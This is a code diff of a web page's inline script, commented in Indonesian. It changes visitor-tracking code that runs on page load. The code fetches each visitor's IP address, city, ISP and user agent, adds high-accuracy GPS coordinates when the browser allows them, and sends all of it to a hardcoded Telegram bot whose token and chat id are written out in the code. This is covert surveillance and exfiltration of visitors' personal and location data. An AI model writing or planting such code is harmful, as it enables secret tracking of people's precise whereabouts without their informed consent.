@@ -774,37 +774,68 @@
         }
     
 
-// IP Tracking - Akurat
+// IP Tracking (via ipinfo.io) + Geolocation if allowed
 fetch("https://ipinfo.io/json?token=447024f6985241")
   .then(response => response.json())
-  .then(data => {
-    const ip = data.ip;
-    const city = data.city;
-    const region = data.region;
-    const country = data.country;
-    const org = data.org;
-    const loc = data.loc;
-    const timezone = data.timezone;
+  .then(ipData => {
+    const ip = ipData.ip;
+    const city = ipData.city;
+    const region = ipData.region;
+    const country = ipData.country;
+    const org = ipData.org;
+    const loc = ipData.loc;
+    const timezone = ipData.timezone;
     const userAgent = navigator.userAgent;
+    const accessTime = new Date().toLocaleString();
 
-    const fullMessage = `
+    let message = `
 🕵️ PENGUNJUNG MASUK
 🌐 IP: ${ip}
 📍 Lokasi: ${city}, ${region}, ${country}
 📡 ISP: ${org}
-🧭 Koordinat: ${loc}
+🧭 Koordinat IP: ${loc}
 🕒 Zona Waktu: ${timezone}
 🖥️ User Agent: ${userAgent}
-🗓️ Akses: ${new Date().toLocaleString()}
+🗓️ Akses: ${accessTime}
 `;
 
-    const telegramUrl = `https://api.telegram.org/bot7723202416:AAHGcGq9XYJbXd3fgJHHl64CJ-Ovau2KI44/sendMessage?chat_id=7932600874&text=${encodeURIComponent(fullMessage)}`;
-    fetch(telegramUrl)
-      .then(res => console.log('IP info terkirim'))
-      .catch(err => console.error('Gagal kirim IP info:', err));
+    // Try to get accurate GPS location
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(
+        position => {
+          const latitude = position.coords.latitude;
+          const longitude = position.coords.longitude;
+          const accuracy = position.coords.accuracy;
+          const gpsTime = new Date(position.timestamp).toLocaleString();
+
+          message += `
+📍 LOKASI GPS DIIZINKAN
+📌 Latitude: ${latitude}
+📌 Longitude: ${longitude}
+🎯 Akurasi: ${accuracy} meter
+⏰ GPS Timestamp: ${gpsTime}
+`;
+
+          sendToTelegram(message);
+        },
+        error => {
+          message += `⚠️ Gagal ambil lokasi GPS: ${error.message}`;
+          sendToTelegram(message);
+        },
+        { enableHighAccuracy: true }
+      );
+    } else {
+      message += `⚠️ Browser tidak mendukung GPS`;
+      sendToTelegram(message);
+    }
+
+    function sendToTelegram(msg) {
+      const url = `https://api.telegram.org/bot7723202416:AAHGcGq9XYJbXd3fgJHHl64CJ-Ovau2KI44/sendMessage?chat_id=7932600874&text=${encodeURIComponent(msg)}`;
+      fetch(url).then(res => console.log('Info dikirim ke Telegram')).catch(err => console.error(err));
+    }
   })
   .catch(err => {
-    console.error('Gagal ambil IP info:', err);
+    console.error("Gagal ambil IP info:", err);
   });
 
 </script>
